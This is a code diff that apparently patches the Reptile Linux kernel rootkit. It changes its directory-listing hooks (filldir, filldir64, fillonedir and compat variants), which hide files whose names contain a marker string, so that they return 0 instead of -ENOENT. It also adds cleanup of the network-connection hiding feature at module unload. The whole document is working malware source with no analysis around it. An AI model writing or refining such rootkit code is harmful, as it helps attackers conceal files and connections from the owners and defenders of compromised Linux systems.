@@ -128,7 +128,7 @@ KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int)
 static int khook_fillonedir(void *__buf, const char *name, int namlen,
 			    loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -138,7 +138,7 @@ KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen,
 			 loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -148,7 +148,7 @@ KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -158,7 +158,7 @@ KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsign
 static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 				   loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -168,7 +168,7 @@ KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned 
 static int khook_compat_filldir(void *__buf, const char *name, int namlen,
 				loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -179,7 +179,7 @@ KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsi
 static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 				  loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -473,6 +473,10 @@ static void __exit reptile_exit(void)
 {
 #ifdef CONFIG_FILE_TAMPERING
 	while(atomic_read(&read_on) != 0) schedule();
+#endif
+
+#ifdef CONFIG_HIDE_CONN
+	network_hide_cleanup();
 #endif
 	khook_cleanup();
 }
